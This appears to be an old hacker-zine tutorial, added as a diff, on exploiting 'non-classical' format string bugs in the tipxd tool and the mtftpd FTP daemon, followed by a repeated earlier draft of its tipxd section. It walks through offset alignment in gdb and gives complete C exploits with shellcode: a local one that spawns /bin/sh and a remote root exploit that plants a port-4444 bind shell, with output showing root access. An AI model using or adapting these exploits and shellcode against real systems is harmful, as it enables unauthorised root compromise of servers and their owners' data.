@@ -1,0 +1,1106 @@
+|=---------------=[ Exploiting non-classical format string vulnerability ]=--------------=|
+|=-----------------------=[ darkeagle <d4rkeagle@gmail.com> ]=---------------------------=|
+|=--------------------=[ 55k7 researcherz <http://www.unl0ck.net> ]=---------------------=|
+
+--[ Table of contents
+
+       1 - Intro
+       2 - Local Exploitation
+       3 - Remote Exploitation
+       4 - References
+
+--[ 1. Intro
+
+One day, I was researching some popular Open-Source Unix daemon. And I
+found format string vulnerability in this daemon. There was vulnerable
+call of "sprintf()" function. I was trying to exploit it. But when I
+put some evil string like this "AAAA.%x.%x.%x.%x.%x.%x.%x.%x" to the
+daemon, I got this type of answer: "bla_bla_bla AAAA.addrz_addrz_addrz_2e334141".
+I was preparing to exploit it triviality with classical method. I added
+in the start two "A" to align offset and try to exploit. But when I attached to child
+process I was looking that EIP registry points to 0x99ffe9fa instead 0xbfffd5fa.
+Later I was google information about "how to exploit" this situation. All what
+I found was paper by Pascal's method of exploiting format string. His paper
+wasn't about exploiting my situation, but with help from his paper I can exploit
+daemon. But... His method wasn't so unique and Pascal wrote that his method is hard to
+understand. So, I started to explore simply way to exploit this situation. And
+I found it! This paper simply describes my method. I'll show you some examples
+on REAL vulnerabilities. Will show local and remote method how to exploit
+non-classical format string vulnerability.
+Just go, yo!
+
+-- [ 2. - Local Exploitation
+
+First in for I wanna say that some time ago in unpopular unix-tool named "tipxd"
+was found format string vulnerability. Vulnerable function was syslog(). Thanks
+to CoKi he discovered this bug.
+
+Vulnerability exists in src/log.c:
+
+void tipxd_log(int priority, char *format, ... )
+{
+ va_list ap;
+ char log_entry[LOG_ENTRY_SIZE];
+
+ va_start(ap,format);
+ vsnprintf(log_entry,LOG_ENTRY_SIZE-1,format,ap);
+
+ if (sysinfo.opt_flags & OPT_STDERR) {
+
+ fprintf(stderr,"[TIPXD LOG] %s\n",log_entry);
+ } else {
+ syslog(priority,log_entry); <------ format string bug
+ }
+
+ return;
+}
+
+So, we see that tipxd_log() calls vulnerable syslog(). Syslog() takes argument
+from user input to tipxd_log() function. Let's see where vulnerable code uses.
+
+src/main.c
+
+int main( int argc, char *argv[] )
+{
+....
+ while ((c = getopt_long(argc,argv,"f:evh",long_options,&option_index)) != -1) {
+ switch (c) {
+ case 'f':
+ if (!(sysinfo.config_filename = malloc(strlen(optarg)))) {
+fprintf(stderr,"Could not allocate memory for filename storage\n");
+ exit(1);
+ }
+
+....
+ tipxd_log( LOG_INFO, "Config file is %s\n", sysinfo.config_filename );
+....
+}
+
+It uses when user try to set configure file. Ok, let's check it.
+
+[darkeagle@localhost bin]$ ./tipxd -f aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
+Unable to open configuration file : No such file or directory
+
+[darkeagle@localhost bin]$ tail -3 /var/log/syslog
+Mar 15 15:53:59 localhost tipxd[6506]: Config file is /etc/tipxd.conf
+Mar 15 15:55:31 localhost tipxd[6582]: Started
+Mar 15 15:55:31 localhost tipxd[6582]: Config file is aaaa.41.41.666e6f43.66206769.20656c69.61207369.2e616161.252e7825.78252e78.2e78252e.252e7825.
+78252e78.2e78252e.252e7825.78252e78
+[darkeagle@localhost bin]$
+
+Yeah! Here you can notice real work! Offset is 7. And here is non-classical format
+string bug. You can align offset adding one byte.
+
+[darkeagle@localhost bin]$ ./tipxd -f baaaa%7$\x
+[darkeagle@localhost bin]$ tail -1 /var/log/syslog
+Mar 15 15:57:48 localhost tipxd[6584]: Config file is aaaa61616161
+[darkeagle@localhost bin]$
+
+But if you'll try to exploit this with classical method you won't exploit it correctly.
+Look at following classical method:
+
+#include <stdio.h>
+
+#define offset 7
+#define var 0x0804f994+0x04 // dtorz
+
+int main(int argc, char *argv[])
+{
+
+char *addr[3] = { ((char *)var +2),
+                ((char *)var),
+               };
+
+char buffer[500], cmd[600];
+long high, low;
+long target = 0x41414141; // retaddr
+
+high = (target & 0xffff0000) >> 16;
+low = (target & 0x0000ffff);
+
+high -= 0x08;
+
+memset(buffer, 0x00, sizeof(buffer));
+
+strcat(buffer, "U"); // to align offset
+sprintf(buffer+strlen(buffer), "%s%%.%dx%%%d$hn%%.%dx%%%d$hn", &addr, high, offset, (low - high)-0x8, offset+1);
+
+printf("%s\n", buffer);
+}
+
+Let's compile/run it:
+
+[darkeagle@localhost bin]$ gcc exp.c -o exp
+[darkeagle@localhost bin]$ gdb tipxd
+GNU gdb 6.0-2mdk (Mandrake Linux)
+Copyright 2003 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB. Type "show warranty" for details.
+This GDB was configured as "i586-mandrake-linux-gnu"...Using host libthread_db library "/lib/tls/libthread_db.so.1".
+
+(gdb) r -f `./exp`
+Starting program: /home/darkeagle/research/tipxd-1.1.1/bin/tipxd -f `./exp`
+Unable to open configuration file : No such file or directory
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41514153 in ?? ()
+(gdb) q
+The program is running. Exit anyway? (y or n) y
+[darkeagle@localhost bin]$
+
+So, you see that we have overwrote only 50%.
+
+My friend CoKi exploited this bug with help from Pascal's method. You can notice his exploit in [1].
+Now I'll show my exploit with new simply method.
+First in for let's look at formula of my method.
+
+<GOT><GOT+1><GOT+2><GOT+3><ADDR><BYTE(s)_TO_ALIGN>%OFFET$n<ADDR>x%OFFSET+1$n<ADDR>x%OFFSET+2$n<ADDR>x%OFFSET+3$n<NOPS><SHELLCODE>
+
+Ok. Time to see code of exploit for tool:
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define doit( b0, b1, b2, b3, addr ) { \
+ b0 = (addr >> 24) & 0xff; \
+ b1 = (addr >> 16) & 0xff; \
+ b2 = (addr >> 8) & 0xff; \
+ b3 = (addr ) & 0xff; \
+}
+
+char
+shellcode[]=
+
+ "\x31\xc0"
+ "\x31\xdb"
+ "\x31\xc9"
+ "\xb0\x46"
+ "\xcd\x80"
+ "\x31\xc0"
+ "\x50"
+ "\x68\x2f\x2f\x73\x68"
+ "\x68\x2f\x62\x69\x6e"
+ "\x89\xe3"
+ "\x8d\x54\x24\x08"
+ "\x50"
+ "\x53"
+ "\x8d\x0c\x24"
+ "\xb0\x0b"
+ "\xcd\x80"
+ "\x31\xc0"
+ "\xb0\x01"
+ "\xcd\x80";
+
+
+char *
+evil_builder( unsigned int retaddr, unsigned int offset, unsigned int base, long figure )
+{
+ char * buf;
+ unsigned char b0, b1, b2, b3;
+ int start = 256;
+
+ doit( b0, b1, b2, b3, retaddr );
+ buf = (char *)malloc(999);
+ memset( buf, 0, 999 );
+
+ b3 -= figure;
+ b2 -= figure;
+ b1 -= figure;
+ b0 -= figure;
+
+ snprintf( buf, 999,
+ "%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n",
+        b3 - 16 + start - base, offset,
+ b2 - b3 + start, offset + 1,
+ b1 - b2 + start, offset + 2,
+ b0 - b1 + start, offset + 3 );
+
+ return buf;
+}
+
+int
+main( int argc, char * argv[] )
+{
+ char * fmt;
+ char endian[55];
+ unsigned long locaddr, retaddr;
+ unsigned int offset, base;
+ unsigned char b0, b1, b2, b3;
+
+ memset( endian, 0, 555 );
+
+ locaddr = 0x0804f994; // dtorz addr
+ retaddr = 0x01010101; // return addr
+ offset = 7; // offset
+ locaddr += 0x4; // dtorz+0x4
+
+ doit( b0, b1, b2, b3, locaddr );
+
+ base = 4;
+
+ strcat(endian, "x"); // byte to align offset
+
+ snprintf( endian+strlen(endian), sizeof(endian),
+ "%c%c%c%c"
+ "%c%c%c%c"
+ "%c%c%c%c"
+ "%c%c%c%c",
+ b3, b2, b1, b0,
+ b3 + 1, b2, b1, b0,
+ b3 + 2, b2, b1, b0,
+ b3 + 3, b2, b1, b0 );
+
+ fmt = evil_builder( retaddr, offset, base, 0x0 );
+
+ memset(fmt+strlen(fmt), 0x42, 48);
+ strcat(fmt, shellcode);
+ strcat(endian, fmt);
+ execl("tipxd", "tipxd", "-f", endian);
+
+ return 0;
+}
+
+So, time to compile/run it.
+
+[darkeagle@localhost bin]$ gcc fmt.c -o fmt
+[darkeagle@localhost bin]$ ./fmt
+Unable to open configuration file : No such file or directory
+
+Segmentation fault (core dumped)
+[darkeagle@localhost bin]$ gdb -c core.7388
+GNU gdb 6.0-2mdk (Mandrake Linux)
+Copyright 2003 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB. Type "show warranty" for details.
+This GDB was configured as "i586-mandrake-linux-gnu".
+Core was generated by `tipxd -f x?U.UsU.U%237x%7$n%256x%8$n%256x%9$n%256x%10$nBBBBBBBBBBBBBBBB'.
+Program terminated with signal 11, Segmentation fault.
+#0 0x0d0d0d0d in ?? ()
+(gdb)
+
+You can see our address isn't 0x01010101. It is 0x0d0d0d0d. Let's calculate align.
+Do next: 0D - 01 = 0C. Our align is 0C = 12 (dec). Next search line:
+        ^^_ ^^_
+        |       |_______________ 'cause retaddr = 0x01010101
+ 'cause EIP = 0x0d0d0d0d
+
+ fmt = evil_builder( retaddr, offset, base, 0x0 );
+ ^^^______ our align = 0
+replce to:
+
+ fmt = evil_builder( retaddr, offset, base, 0xC );
+ ^^^______ we get align = 0xC
+
+Let's recompile it and run.
+
+Compile and run:
+
+[darkeagle@localhost bin]$ gcc fmt.c -o fmt
+[darkeagle@localhost bin]$ ./fmt
+Unable to open configuration file : No such file or directory
+
+Segmentation fault (core dumped)
+[darkeagle@localhost bin]$ gdb -c core.7398
+GNU gdb 6.0-2mdk (Mandrake Linux)
+Copyright 2003 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB. Type "show warranty" for details.
+This GDB was configured as "i586-mandrake-linux-gnu".
+Core was generated by `tipxd -f x?U.UsU.U%481x%7$n%256x%8$n%256x%9$n%256x%10$nBBBBBBBBBBBBBBBB'.
+Program terminated with signal 11, Segmentation fault.
+#0 0x01010101 in ?? ()
+(gdb)
+
+Yeah baby, Yeah! We've got it! Our return address is 0x01010101.
+Now we must get a shell. In the stack we need to search address to shellcode.
+Do next:
+
+(gdb) x/1024x $esp
+       ...............
+       ...............
+       ...............
+0xbfffff7c: 0x3532256e 0x39257836 0x32256e24 0x25783635
+0xbfffff8c: 0x6e243031 0x42424242 0x42424242 0x42424242
+0xbfffff9c: 0x42424242 0x42424242 0x42424242 0x42424242
+0xbfffffac: 0x42424242 0x42424242 0x42424242 0x42424242
+0xbfffffbc: 0x42424242 0xdb31c031 0x46b0c931 0xc03180cd
+0xbfffffcc: 0x2f2f6850 0x2f686873 0x896e6962 0x24548de3
+0xbfffffdc: 0x8d535008 0x0bb0240c 0xc03180cd 0x80cd01b0
+       ..............
+       ..............
+(gdb)
+
+Ok, you can see "BBBB". Get this address. I've got "0xbfffffac".
+Stop, somebody of you can say: "Why we get addresses which consists 0x42424242?".
+Ok, I can simply answer. In our case BBBB is NOPs. NOPs it's free instruction, you
+can notice that after our NOPs exists shellcode. Then it means that our shellcode
+will be successfully executed. Let's check it.
+Put 0xbfffffac instead 0x01010101. Recompile/run.
+
+[darkeagle@localhost bin]$ gcc fmt.c -o fmt
+[darkeagle@localhost bin]$ ./fmt
+Unable to open configuration file : No such file or directory
+
+sh-2.05b$
+
+So, we got shell!
+
+--[ 3. - Remote Exploitation
+
+Ok! Let's check our new power on another real example! Some time ago, I found
+remote bug in unpopular Unix-ftpd daemon named "mtftpd". In this daemon also
+exists format string vulnerability in syslog() function. Version of vulnerable
+daemon is <= 0.0.3. You can get it from sf.net project. Let's see vulnerable code.
+
+src/log.c:
+
+static void log_do(const int err, const int prd, const char *fmt, va_list ap)
+{
+#define MAXLINE 4096
+       int errno_save;
+       char buf[MAXLINE];
+
+       errno_save = errno;
+       bzero(buf, sizeof(buf));
+       vsnprintf(buf, sizeof(buf) - 1, fmt, ap);
+       if(err) {
+               snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf) - 1,
+                               ": %s", strerror(errno_save));
+       }
+       strcat(&buf[MIN(sizeof(buf) - 2, strlen(buf))], "\n");
+#if MT_DEBUG && !MT_WANT_INETD
+       write(STDERR_FILENO, buf, strlen(buf));
+#else
+       syslog(prd, buf); // Another Format String Vulnerability
+#endif
+}
+
+You see that here also the same problem which was in our local tool. Syslog() takes
+argument from user input in CWD command which shows in below code:
+
+src/cmd.c:
+
+CMD_P(cwd)
+{
+       int ret;
+
+#if MT_DEBUG
+       log_msg("session: %d. You are into cmd_cwd()", ses->ses);
+#endif
+
+       ret = chdir(param);
+       if(ret) {
+               char path[PATH_MAX];
+
+               if(*param == '/')
+                       strcpy(path, param);
+               else
+                       sprintf(path, "%s/%s",
+                               strcmp("/", ses->wd) ? ses->wd : "", param);
+       log_ret("chdir error to dir %s", path); <------- If directory doesn't exists calls vulnerable syslog() function
+               mt_comm_write(ses, "550 %s.", strerror(errno));
+       } else {
+               getcwd(ses->wd, PATH_MAX);
+               mt_comm_write(ses, "250 CWD command successful.");
+       }
+}
+
+
+Vulnerability code works only if daemon
+configured with --enable-statistics option. And I wanna say that mtftpd compiles
+only under gcc 2.96 or earlier. Time to check daemon.
+
+[darkeagle@localhost mtftpd-0.0.3]$ ./configure --enable-statistics
+....
+[darkeagle@localhost mtftpd-0.0.3]$ make
+....
+[darkeagle@localhost mtftpd-0.0.3]$ cd src
+[darkeagle@localhost mtftpd-0.0.3]$ su
+Password:
+[root@localhost src]# ./mtftpd
+[root@localhost src]#
+
+Mtftpd coded with threads. For every client mtftpd does his own thread. Let's connect to ftpd.
+
+[darkeagle@localhost darkeagle]$ telnet localhost 21
+Trying 127.0.0.1...
+Connected to localhost.localdomain (127.0.0.1).
+Escape character is '^]'.
+220
+user darkeagle
+331 Password required for user darkeagle
+pass IloveYouVicky
+230 User darkeagle logged in.
+
+Next see processes in system. And let's attach to child process to explore it.
+
+[root@localhost src]# ps -ax
+ ....
+ 2570 ? S 0:00 ./mtftpd
+ 4221 pts3 S 0:00 telnet localhost 21
+ 4222 ? S 0:00 ./mtftpd <-------- child process which was born when we connected to ftpd with telnel
+ 4225 pts0 R 0:00 ps -ax
+ ....
+[root@localhost src]# gdb
+GNU gdb 6.0-2mdk (Mandrake Linux)
+Copyright 2003 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB. Type "show warranty" for details.
+This GDB was configured as "i586-mandrake-linux-gnu".
+(gdb) attach 4222
+Attaching to process 4222
+Reading symbols from /home/darkeagle/research/mtftpd-0.0.3/src/mtftpd...done.
+Using host libthread_db library "/lib/tls/libthread_db.so.1".
+Reading symbols from /lib/libcrypt.so.1...done.
+Loaded symbols for /lib/libcrypt.so.1
+Reading symbols from /lib/tls/libc.so.6...done.
+Loaded symbols for /lib/tls/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...done.
+Loaded symbols for /lib/ld-linux.so.2
+Reading symbols from /lib/libnss_files.so.2...done.
+Loaded symbols for /lib/libnss_files.so.2
+0xffffe410 in ?? ()
+(gdb) c
+Continuing.
+
+Ok, put evil argument to CWD command.
+
+cwd AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
+550 No such file or directory.
+
+Time to see syslog.
+
+[root@localhost src]# tail -1 /var/log/syslog
+Jul 10 00:06:57 localhost mtftpd: chdir error to dir /home/darkeagle/AAAA.bfffd240.bfffd240.69646863.72652072.20726f72.64206f74.2f207269.656d6f68.7261642f.6761656b.412f656c.2e414141.252e7825.78252e78.2e78252e.252e7825.78252e78: No such file or directory
+[root@localhost src]#
+
+Yeah, we see that vulnerability code is working. Ugly offset = 12. And it's also same
+like in local tool. Ok, we let's write an exploit for this daemon, it will be root exploit.
+
+My code looks like this:
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <errno.h>
+#include <string.h>
+#include <getopt.h>
+#include <netdb.h>
+#include <sys/types.h>
+#include <sys/fcntl.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+
+#define USERNAME "USER darkeagle\r\n\r\n"
+#define PASSWORD "PASS tch8334\r\n\r\n"
+
+#define doit( b0, b1, b2, b3, addr ) { \
+ b0 = (addr >> 24) & 0xff; \
+ b1 = (addr >> 16) & 0xff; \
+ b2 = (addr >> 8) & 0xff; \
+ b3 = (addr ) & 0xff; \
+}
+
+// metasploit guys shellcode
+char shellcode[] = // binds 4444 port
+"\x31\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x85"
+"\x4f\xca\xdf\x83\xeb\xfc\xe2\xf4\xb4\x94\x99\x9c\xd6\x25\xc8\xb5"
+"\xe3\x17\x53\x56\x64\x82\x4a\x49\xc6\x1d\xac\xb7\x94\x13\xac\x8c"
+"\x0c\xae\xa0\xb9\xdd\x1f\x9b\x89\x0c\xae\x07\x5f\x35\x29\x1b\x3c"
+"\x48\xcf\x98\x8d\xd3\x0c\x43\x3e\x35\x29\x07\x5f\x16\x25\xc8\x86"
+"\x35\x70\x07\x5f\xcc\x36\x33\x6f\x8e\x1d\xa2\xf0\xaa\x3c\xa2\xb7"
+"\xaa\x2d\xa3\xb1\x0c\xac\x98\x8c\x0c\xae\x07\x5f";
+
+
+// Do our evil DeeDz
+char *
+evil_builder( unsigned int retaddr, unsigned int offset, unsigned int base, long figure )
+{
+ char * buf;
+ unsigned char b0, b1, b2, b3;
+ int start = 256;
+
+ doit( b0, b1, b2, b3, retaddr );
+ buf = (char *)malloc(999);
+ memset( buf, 0, 999 );
+
+ b3 -= figure;
+ b2 -= figure; // align our addr
+ b1 -= figure;
+ b0 -= figure;
+
+ snprintf( buf, 999,
+ "%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n",
+        b3 - 16 + start - base, offset,
+ b2 - b3 + start, offset + 1,
+ b1 - b2 + start, offset + 2,
+ b0 - b1 + start, offset + 3 );
+
+ return buf;
+}
+
+int main ( int argc, char *argv )
+{
+
+       int sock;
+       struct sockaddr_in addr;
+       char evildata[31337], rec[555], shell[555];
+
+       unsigned long locaddr, retaddr;
+       unsigned int offset, base;
+       unsigned char b0, b1, b2, b3;
+       char * fmt;
+
+system("clear");
+
+printf("* mtftpd <= 0.0.3 remote r00t exploit *\n");
+printf("*               by Darkeagle     *\n\n");
+
+sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
+
+addr.sin_family = AF_INET;
+addr.sin_port = htons(21);
+addr.sin_addr.s_addr = inet_addr("127.0.0.1");
+
+memset(evildata, 0x00, 31337);
+memset(rec, 0x00, 555);
+memset(shell, 0x00, 555);
+
+if (connect(sock, (struct sockaddr*)&addr, sizeof(addr) ) ) { printf("[-] Connection failed!\n"); exit(0); }
+
+sleep(10); // time to debug child process
+
+locaddr = 0x0804fd10; // syslog from GOT
+retaddr = 0x01010101; // retaddr
+offset = 12;     // offset
+
+doit( b0, b1, b2, b3, locaddr ); // let's do it
+base = 4;
+
+strcat(evildata, "CWD x"); // copy vulnerable command and "x" to align our offset
+snprintf( evildata+strlen(evildata), sizeof(evildata),
+ "%c%c%c%c"
+ "%c%c%c%c"
+ "%c%c%c%c"
+ "%c%c%c%c",
+ b3, b2, b1, b0,
+ b3 + 1, b2, b1, b0,
+ b3 + 2, b2, b1, b0,
+ b3 + 3, b2, b1, b0 );
+
+ fmt = evil_builder( retaddr, offset, base, 0x0 );
+
+ memset(fmt+strlen(fmt), 0x55, 32);
+ strcat(fmt, shellcode);
+ strcat(evildata, fmt);
+ strcat(evildata, "\r\n\r\n\r\n");
+
+ send(sock, USERNAME, strlen(PASSWORD), 0);
+ sleep(1);
+ send(sock, PASSWORD, strlen(PASSWORD), 0);
+ sleep(2);
+ recv(sock, rec, sizeof(rec), 0);
+
+ if (strstr(rec, "230") ) printf("[+] Logged In!\n"); else { printf("[-] Failed!\n"); exit(0); }
+
+ printf("[+] Sending our Evil DeeD\n");
+ send(sock, evildata, strlen(evildata), 0);
+ sleep(1);
+ strcpy(shell, "telnet localhost 4444");
+ sleep(6);
+ system(shell);
+ close(sock);
+ return 0;
+
+}
+
+Compile/run and attach to child process.
+
+[root@localhost src]# gdb
+GNU gdb 6.0-2mdk (Mandrake Linux)
+Copyright 2003 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB. Type "show warranty" for details.
+This GDB was configured as "i586-mandrake-linux-gnu".
+(gdb) attach 4514
+Attaching to process 4514
+Reading symbols from /home/darkeagle/research/mtftpd-0.0.3/src/mtftpd...done.
+Using host libthread_db library "/lib/tls/libthread_db.so.1".
+Reading symbols from /lib/libcrypt.so.1...done.
+Loaded symbols for /lib/libcrypt.so.1
+Reading symbols from /lib/tls/libc.so.6...done.
+Loaded symbols for /lib/tls/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...done.
+Loaded symbols for /lib/ld-linux.so.2
+Reading symbols from /lib/libnss_files.so.2...done.
+Loaded symbols for /lib/libnss_files.so.2
+0xffffe410 in ?? ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x21212121 in ?? ()
+(gdb)
+
+Yeah! EIP = 0x21212121. So, calculate 0x21 - 0x01 = 0x20. Put 0x20 instead 0x0 in
+
+fmt = evil_builder( retaddr, offset, base, 0x20 );
+
+Recompile/Run, attach to child process.
+
+[root@localhost src]# gdb
+GNU gdb 6.0-2mdk (Mandrake Linux)
+...
+(gdb) attach 4536
+Attaching to process 4536
+Reading symbols from /home/darkeagle/research/mtftpd-0.0.3/src/mtftpd...done.
+Using host libthread_db library "/lib/tls/libthread_db.so.1".
+Reading symbols from /lib/libcrypt.so.1...done.
+Loaded symbols for /lib/libcrypt.so.1
+Reading symbols from /lib/tls/libc.so.6...done.
+Loaded symbols for /lib/tls/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...done.
+Loaded symbols for /lib/ld-linux.so.2
+Reading symbols from /lib/libnss_files.so.2...done.
+Loaded symbols for /lib/libnss_files.so.2
+0xffffe410 in ?? ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x01010101 in ?? ()
+(gdb)
+
+Yeah! We got 0x01010101! Next time to search address on shellcode.
+Do next:
+
+(gdb) x/200000x $esp-0x1000
+...........
+0xbfffd28c: 0x34312578 0x32256e24 0x25783635 0x6e243531
+0xbfffd29c: 0x55555555 0x55555555 0x55555555 0x55555555
+0xbfffd2ac: 0x55555555 0x55555555 0x55555555 0x55555555
+0xbfffd2bc: 0x55555555 0x55555555 0x55555555 0x55555555
+0xbfffd2cc: 0xe983c931 0xd9eed9eb 0x5bf42474 0x85137381
+0xbfffd2dc: 0x83dfca4f 0xf4e2fceb 0x9c9994b4 0xb5c825d6
+0xbfffd2ec: 0x565317e3 0x494a8264 0xb7ac1dc6 0x8cac1394
+0xbfffd2fc: 0xb9a0ae0c 0x899b1fdd 0x5f07ae0c 0x3c1b2935
+0xbfffd30c: 0x8d98cf48 0x3e430cd3 0x5f072935 0x86c82516
+0xbfffd31c: 0x5f077035 0x6f3336cc 0xf0a21d8e 0xb7a23caa
+0xbfffd32c: 0xb1a32daa 0x8c98ac0c 0x5f07ae0c 0x6f4e203a
+0xbfffd33c: 0x63757320 0x69662068 0x6f20656c 0x69642072
+0xbfffd34c: 0x74636572 0x0a79726f 0x00000000 0x00000000
+0xbfffd35c: 0x00000000 0x00000000 0x00000000 0x00000000
+............
+(gdb) q
+
+So, you see that our address is "0xbfffd29c". Put it instead 0x01010101.
+Recompile/Run.
+
+[darkeagle@localhost code]$ gcc exp.c -o exp_p
+[darkeagle@localhost code]$ ./exp_p
+
+* mtftpd <= 0.0.3 remote r00t exploit *
+* by Darkeagle *
+
+[+] Logged In!
+[+] Sending our Evil DeeD
+Trying 127.0.0.1...
+Connected to localhost.localdomain (127.0.0.1).
+Escape character is '^]'.
+id;
+uid=0(root) gid=0(root) groups=0(root)
+: command not found
+
+We got root! So, you brain got phracked! And now you got knowledge about simple method in
+exploiting situations like my.
+
+--[ 4. - Greets
+Greets goes to: all friends from 55k7 research team, CoKi, crash-x, TPOC, etc.
+
+--[ 5. - References
+
+[1]. CoKi's exploit for tipxd - http://www.nosystem.com.ar/exploits/tipxd_exp.c
+[2]. CoKi's advisory to tipxd - http://www.nosystem.com.ar/advisories/advisory-08.txt
+[3]. Pascal's paper about format string exploitation - http://unl0ck.org/files/docz/pascal-fmt.txt
+
+|=[ EOF ]=-------------------------------------------------------------------------------=|
+
+
+Exploiting non-classical format string.
+
+Under non-classical format string exploiting i mean cases, when you got offset like
+0x2e586161 instead 0x61616161. In this case you can't use classical method of exploitation.
+In one of the Pascal's articles about format string i was noticed some interesting
+method of exploitation. Formula of this exploitation below:
+
+<GOT><GOT+1><GOT+2><GOT+3>
+<OFFSET><NOPS>\xeb\x02%n<NOPS>\xeb\x02%n<NOPS>\xeb\x02%n<NOPS>\xeb\x02%n
+
+This formula is unique but very difficult to understand.
+
+In my article, I wanna show you my method of exploitation non-classical format string on
+the real vulnerability in some tool.
+
+Ok, let's do it...
+
+Exploitation:
+
+Example of vulnerable tool will be tipxd. In this tool exist format string vulnerability in syslog() function. This bug was founded by my nice friend - CoKi from No System Group. He already exploited it with Pascal's method. Link to his exploit you can see at
+the end of article.
+
+Let's explore his bug...
+
+Vulnerability exist in src/log.c:
+
+void tipxd_log(int priority, char *format, ...  )
+{
+  va_list ap;
+  char log_entry[LOG_ENTRY_SIZE];
+
+  va_start(ap,format);
+  vsnprintf(log_entry,LOG_ENTRY_SIZE-1,format,ap);
+
+  if (sysinfo.opt_flags & OPT_STDERR) {
+
+      fprintf(stderr,"[TIPXD LOG] %s\n",log_entry);
+  } else {
+      syslog(priority,log_entry); <------ format string bug
+  }
+
+  return;
+}
+
+Ok, let's searching where this function are using...
+
+src/main.c
+
+int main( int argc, char *argv[] )
+{
+....
+  while ((c = getopt_long(argc,argv,"f:evh",long_options,&option_index)) != -1) {
+      switch (c) {
+          case 'f':
+              if (!(sysinfo.config_filename = malloc(strlen(optarg)))) {
+fprintf(stderr,"Could not allocate memory for filename storage\n");
+                  exit(1);
+              }
+
+....
+  tipxd_log( LOG_INFO, "Config file is %s\n", sysinfo.config_filename );
+....
+}
+
+You can notice, that vulnerability are use when user try to put config file in command line. Let's check it...
+
+[darkeagle@localhost bin]$ ./tipxd -f aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
+Unable to open configuration file : No such file or directory
+
+[darkeagle@localhost bin]$ tail -3 /var/log/syslog
+Mar 15 15:53:59 localhost tipxd[6506]: Config file is /etc/tipxd.conf
+Mar 15 15:55:31 localhost tipxd[6582]: Started
+Mar 15 15:55:31 localhost tipxd[6582]: Config file is aaaa.41.41.666e6f43.66206769.20656c69.61207369.2e616161.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78
+[darkeagle@localhost bin]$
+
+It is true! Our ugly offset (2e616161) situarted at 7th place.
+
+[darkeagle@localhost bin]$ ./tipxd -f aaaa%7$\x
+[darkeagle@localhost bin]$ tail -1 /var/log/syslog
+Mar 15 15:57:48 localhost tipxd[6584]: Config file is aaaa25616161
+[darkeagle@localhost bin]$
+
+You can see that our offset-addr isn't 0x61616161. But we can align it by 1 byte.
+
+[darkeagle@localhost bin]$ ./tipxd -f baaaa%7$\x
+Unable to open configuration file : No such file or directory
+
+[darkeagle@localhost bin]$ tail -1 /var/log/syslog
+Mar 15 15:59:36 localhost tipxd[6586]: Config file is baaaa61616161
+[darkeagle@localhost bin]$
+
+Now people can say that next way, we can exploit it by standard method.
+But it isn't. 'Cause I tried it! I'm overwrote only 50% of GOT address.
+
+Let's look at classical exploit for this:
+
+--------------------------------------------------------------
+
+#include <stdio.h>
+
+#define offset 7
+#define var 0x0804f994+0x04
+
+int main(int argc, char *argv[])
+{
+
+char *addr[3] = { ((char *)var +2),
+                 ((char *)var),
+               };
+
+char buffer[500], cmd[600];
+long high, low;
+long target = 0x41414141;
+
+high = (target & 0xffff0000) >> 16;
+low = (target & 0x0000ffff);
+high -= 0x08;
+memset(buffer, 0x00, sizeof(buffer));
+strcat(buffer, "U"); // to align offset
+sprintf(buffer+strlen(buffer), "%s%%.%dx%%%d$hn%%.%dx%%%d$hn", &addr, high, offset, (low - high)-0x8, offset+1);
+
+printf("%s\n", buffer);
+}
+
+--------------------------------------------------------------
+
+Let's compile/run it:
+
+[darkeagle@localhost bin]$ gcc exp.c -o exp
+[darkeagle@localhost bin]$ gdb tipxd
+GNU gdb 6.0-2mdk (Mandrake Linux)
+Copyright 2003 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i586-mandrake-linux-gnu"...Using host libthread_db library "/lib/tls/libthread_db.so.1".
+
+(gdb) r -f `./exp`
+Starting program: /home/darkeagle/research/tipxd-1.1.1/bin/tipxd -f `./exp`
+Unable to open configuration file : No such file or directory
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41514153 in ?? ()
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+[darkeagle@localhost bin]$
+
